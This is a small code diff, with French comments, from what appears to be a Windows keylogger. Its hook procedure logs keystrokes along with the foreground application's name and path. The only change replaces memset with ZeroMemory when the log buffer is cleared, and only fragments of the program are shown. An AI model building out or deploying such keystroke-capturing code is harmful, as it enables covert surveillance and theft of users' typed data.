@@ -54,7 +54,7 @@ LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
                 WriteLogs(logsBuffer, appName, path);
 
                 //On vide logsBuffer
-                memset(logsBuffer, 0, sizeof(logsBuffer));
+                ZeroMemory(logsBuffer, sizeof(logsBuffer));
             }
 
             if (foregroundApp != prevForegroundApp) //Si la foregroundApp n'est pas la même que la précédante
@@ -64,7 +64,7 @@ LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
                     WriteLogs(logsBuffer, appName, path);
 
                     //On vide logsBuffer
-                    memset(logsBuffer, 0, sizeof(logsBuffer));
+                    ZeroMemory(logsBuffer, sizeof(logsBuffer));
                 }
 
                 //On vide appName et path
@@ -96,7 +96,7 @@ LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
                 {
                     WriteLogs(logsBuffer, appName, path);
                     //On vide logsBuffer
-                    memset(logsBuffer, 0, sizeof(logsBuffer));
+                    ZeroMemory(logsBuffer, sizeof(logsBuffer));
                 }
                 break;
             default:    //Sinon
